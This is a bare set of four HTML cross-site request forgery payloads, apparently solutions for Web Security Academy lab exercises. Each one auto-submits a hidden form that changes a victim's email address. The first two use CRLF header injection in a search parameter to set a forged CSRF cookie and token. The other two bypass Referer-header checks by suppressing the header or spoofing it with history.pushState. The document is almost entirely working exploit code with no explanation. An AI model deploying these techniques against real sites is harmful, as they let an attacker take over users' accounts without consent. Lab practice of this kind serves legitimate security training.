```html
<form method="post" action="https://ac301fc11f22956980ff042700f00085.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="test3@test3.com">
<input type="hidden" name="csrf" value="C5q3X1KlGjxuczGNlcZC5DxTsmDet0HU">

</form>
<img src="https://ac301fc11f22956980ff042700f00085.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=R0HaTvPFWXqPHAAU6fseKIGkznxLOxz0" onerror="document.forms[0].submit();">
```



```html
<form method="post" action="https://acdb1f661fc803f1805b74e5004600e9.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="test3@test3.com">
 <input type="hidden" name="csrf" value="fake">
</form>
<img src="https://acdb1f661fc803f1805b74e5004600e9.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit();"/>
```



```html
<meta name="referrer" content="no-referrer">
<form method="post" action="https://ac1b1f0f1e5d511980034fba00e1005e.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="test3@test3.com">
</form>
<script>
      document.forms[0].submit();
</script>
```





```html
<meta name="referrer" content="https://ac6d1fb51e022f4b805b6b7200b10046.web-security-academy.net/email">
<form method="post" action="https://ac6d1fb51e022f4b805b6b7200b10046.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="test3@test3.com">
</form>
<script>
      history.pushState("", "", "/?https://ac6d1fb51e022f4b805b6b7200b10046.web-security-academy.net/")
      document.forms[0].submit();
</script>
```

